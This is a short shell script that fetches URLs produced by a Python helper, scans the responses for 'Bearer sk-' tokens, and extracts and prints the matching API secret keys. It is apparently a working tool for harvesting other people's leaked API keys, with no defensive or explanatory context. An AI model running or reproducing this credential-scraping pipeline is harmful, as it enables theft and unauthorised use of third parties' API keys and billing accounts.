python3 2.py > 1.links
curl -vkL $(cat 1.links) > out
cat out | grep 'Bearer sk-*' > out.keys
cat out.keys | awk '{ print $3 }' | sed 's/.\{3\}$//' > keys
echo $(cat keys)

